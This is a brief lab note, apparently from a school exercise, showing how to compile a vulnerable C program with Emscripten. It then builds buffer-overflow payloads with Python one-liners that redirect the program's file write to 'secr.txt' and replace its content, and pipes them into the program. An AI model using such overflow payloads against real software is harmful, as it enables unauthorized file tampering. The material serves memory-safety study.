## Arbitratry file write 

**Compiling the program:**
```
docker run --rm -v "$(pwd):$(pwd)" -u $(id -u):$(id -g) emscripten/emsdk:3.1.62 emcc ~/School/stack-overflow/data-corruption/main.c -o  ~/School/stack-overflow/data-corruption/main.js -lnodefs.js -s MODULARIZE=1  -s "EXPORTED_RUNTIME_METHODS=['FS', 'callMain']"  -s "EXPORTED_FUNCTIONS=['_main']"
```

**Generating payload to modify the the file to write to**
```
python3 -c 'open("payload.bin", "wb").write(32 * b"A" + 54 * b"B" + b"w\x00" + b"secr.txt")'
```

**Generating payload to modify  the file to write to and its content**
```
python3 -c 'open("payload.bin", "wb").write(32 * b"A" + 54 * b"B" + b"w\x00" + b"secr.txt\x00" + 55 * b"c" + b"Go ahead my sweet prince, press the nuke button.\x00")'
```

**Executing the program with exploit:**
```
cat payload.bin | node run.js
```